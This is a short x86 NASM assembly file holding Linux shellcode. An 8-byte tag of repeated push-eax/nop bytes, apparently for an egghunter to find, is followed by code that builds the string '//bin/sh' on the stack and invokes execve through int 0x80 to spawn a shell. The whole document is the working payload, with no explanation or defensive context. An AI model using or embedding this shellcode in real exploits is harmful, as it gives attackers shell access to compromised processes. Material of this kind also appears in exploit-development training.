section .text
    global _start

_start:
    db 0x50, 0x90, 0x50, 0x90
    db 0x50, 0x90, 0x50, 0x90

    xor ecx, ecx
    mul ecx
    push eax
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi 

    mov ebx, esp
    mov eax, 0xb
    int 0x80
